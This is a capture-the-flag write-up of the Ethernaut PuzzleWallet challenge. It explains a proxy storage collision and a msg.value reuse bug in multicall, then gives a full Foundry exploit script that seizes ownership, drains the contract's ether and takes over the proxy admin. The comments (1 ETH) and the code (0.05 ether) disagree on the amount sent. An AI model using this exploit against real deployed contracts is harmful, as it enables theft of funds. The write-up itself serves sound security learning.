---
layout: writeup
title: "PuzzleWallet"
level: "Intermediate"
category: "Ethernaut"
description: "You need to hijack the wallet to become the admin of the proxy."
---

## Analysis

It consists of two contracts: 
   ->Puzzle Proxy(proxy) 
   ->Puzzle Wallet(implementation)
This challenge itself combines of 3 bugs:
   ->upgradeable proxy `storage collision`
   ->Broken access call via delegatecall
   ->Multicall `msg.value` reuse bug.

**The Flaw:**
Because of delegate call both contracts share the same storage slots.As all know that solidity assigns storage by order of declaration so  writing to pendingAdmin(slot0 of PuzzleProxy storage) overwrites owner (slot0 of PuzzleWallet storage) as well as writing to the Admin(slot1 of PuzzleProxy storage) overwrites maxBalance This is the entire exploit.


 
---

## Solution

**Step-by-Step:**

1. **Become wallet owner(via proxy)** i.e, call proposeNewAdmin(attackerAddress);
  //This writes to pendingAdmin->slot0 but in wallet context owner->slot0 which results in owner=attacker.

2. **whiteList yourself** i.e, call addToWhitelist(attacker);
  //already owner->attacker and it requires require(msg.sender==owner) 

3.**Exploit Multicall** i.e, we craft Multicalls
 //inner call: deposit()    outer call: multicall([deposit(),multicall([deposit()])]) results is if we send 1 eth,    balance becomes 2 eth

4.**Drain the contract** i.e, call execute(attacker,2 ether,"");
  //contract balance is 0.This is required for the final step.

5.**Overwrite Admin** i.e, call setMaxBalance(uint256(uint160(Attacker_address)));
  //maxBalance->slot1 which overwrites Admin but condition is require(address(this).balance==0) as we already drained it and the result is Admin=Attacker.
   
---

**Exploiy Script (Foundry):**

<pre class="plain-code"><code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/PuzzleWallet.sol";

contract ExploitPuzzleWallet is Script {
    function run() external {
        address attacker = msg.sender;
        address proxyAddress = vm.envAddress("PROXY_ADDRESS");

        PuzzleProxy proxy = PuzzleProxy(payable(proxyAddress));
        PuzzleWallet wallet = PuzzleWallet(payable(proxyAddress));

        vm.startBroadcast();

        // 1. Become owner via storage collision (Slot 0)
        proxy.proposeNewAdmin(attacker);

        // 2. Whitelist attacker
        wallet.addToWhitelist(attacker);

        // 3. Build multicall exploit
        // deposit calldata
        bytes memory depositData = abi.encodeWithSelector(wallet.deposit.selector);

        // inner multicall: [deposit()]
        bytes[] memory inner = new bytes[](1);
        inner[0] = depositData;

        bytes memory innerCall = abi.encodeWithSelector(wallet.multicall.selector, inner);

        // outer multicall: [deposit(), multicall(inner)]
        bytes[] memory outer = new bytes[](2);
        outer[0] = depositData;
        outer[1] = innerCall;

        // execute exploit: Sends 1 ETH but credits 2 ETH to your balance
        wallet.multicall{value: 0.05 ether}(outer);

        // 4. Drain ETH (Assuming contract had 1 ETH initially + your 1 ETH)
        uint256 amount = address(wallet).balance;
        wallet.execute(attacker, amount, "");


        // 5. Overwrite admin (Slot 1 collision)
        wallet.setMaxBalance(uint256(uint160(attacker)));

        vm.stopBroadcast();
    }
}
</code></pre>

---